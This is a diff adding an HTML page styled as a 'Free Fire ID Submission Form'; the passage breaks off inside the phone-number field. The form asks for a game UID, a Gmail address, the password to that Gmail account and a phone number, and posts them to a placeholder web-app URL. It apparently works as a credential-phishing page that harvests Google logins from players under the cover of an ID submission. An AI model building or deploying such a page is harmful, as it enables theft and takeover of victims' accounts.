@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Fire ID Submission Form</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      padding: 40px;
+      max-width: 500px;
+      width: 100%;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #333;
+      text-align: center;
+    }
+    .subtitle {
+      text-align: center;
+      color: #666;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+    .form-group { margin-bottom: 20px; }
+    label {
+      display: block;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #333;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 14px;
+      font-family: inherit;
+      transition: border-color 0.3s;
+    }
+    input:focus { outline: none; border-color: #667eea; }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #667eea;
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 10px;
+    }
+    button:hover { background: #5568d3; }
+    button:active { background: #4452ba; }
+    .message {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+      display: none;
+    }
+    .message.success { background: #d4edda; color: #155724; display: block; }
+    .message.error { background: #f8d7da; color: #721c24; display: block; }
+    .helper-text { font-size: 12px; color: #999; margin-top: 4px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎮 Free Fire ID Submission</h1>
+    <p class="subtitle">Please fill in your account details below</p>
+
+    <form id="fireForm" method="POST" action="YOUR_WEB_APP_URL_HERE">
+      <div class="form-group">
+        <label for="uid">UID (User ID) *</label>
+        <input
+          type="text"
+          id="uid"
+          name="uid"
+          placeholder="Enter your Free Fire UID"
+          required
+        />
+      </div>
+
+      <div class="form-group">
+        <label for="email">Gmail ID *</label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="your@gmail.com"
+          required
+        />
+        <div class="helper-text">Must be a Gmail address (@gmail.com)</div>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password *</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Enter password"
+          minlength="6"
+          required
+        />
+        <div class="helper-text">Minimum 6 characters</div>
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Contact Number *</label>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="9876543210"
+          pattern="[0-9
